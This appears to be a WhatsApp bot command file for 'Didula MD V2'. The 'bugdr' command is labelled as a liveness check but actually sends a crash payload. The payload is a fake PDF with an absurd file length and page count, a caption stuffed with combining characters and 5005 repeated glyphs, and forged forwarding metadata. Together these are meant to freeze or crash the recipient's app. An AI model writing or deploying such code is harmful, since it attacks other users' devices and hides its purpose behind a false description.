const { cmd, commands } = require('../lib/command');
const config = require('../settings');
const si = require('systeminformation');
const pdfUrl = "https://i.ibb.co/tC37Q7B/20241220-122443.jpg";
const fs = require('fs');
const path = require('path')




cmd({
    pattern: "bugdr",
    desc: "Check if the bot is alive.",
    category: "main",
    react: "✅",
    filename: __filename
}, async (conn, mek, m, { from, quoted, reply }) => {
    try {
        await conn.sendMessage(from, { text: '*◆─〈 ✦𝐃𝐢𝐝𝐮𝐥𝐚 𝐌𝐃 𝐕𝟐✦ 〉─◆*' });

        const startTime = Date.now();
        await new Promise(resolve => setTimeout(resolve, 500));
        const endTime = Date.now();
        const ping = endTime - startTime;

        await conn.sendMessage(from, {
            document: { url: 'https://i.ibb.co/tC37Q7B/20241220-122443.jpg' },
            fileName: '〈 ✦𝐃𝐢𝐝𝐮𝐥𝐚 𝐌𝐃 𝐕𝟐✦ 〉',
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024,
            caption: "`Didula`\n>  ͆ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺\n" + "ી".repeat(5005),
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: '〈 ✦𝐃𝐢𝐝𝐮𝐥𝐚 𝐌𝐃 𝐕𝟐✦ 〉',
                    newsletterJid: "120363343196447945@newsletter",
                },
                externalAdReply: {
                    title: '©〈 ✦𝐃𝐢𝐝𝐮𝐥𝐚 𝐌𝐃 𝐕𝟐✦ 〉',
                    body: ' *〈 ✦𝐃𝐢𝐝𝐮𝐥𝐚 𝐌𝐃 𝐕𝟐✦ 〉*',
                    thumbnailUrl: 'https://i.ibb.co/tC37Q7B/20241220-122443.jpg',
                    sourceUrl: 'https://wa.me/message/DIDULLTK7ZOGH1',
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        });

    } catch (error) {
        console.error(error);
        reply('An error occurred while processing your request.');
    }
});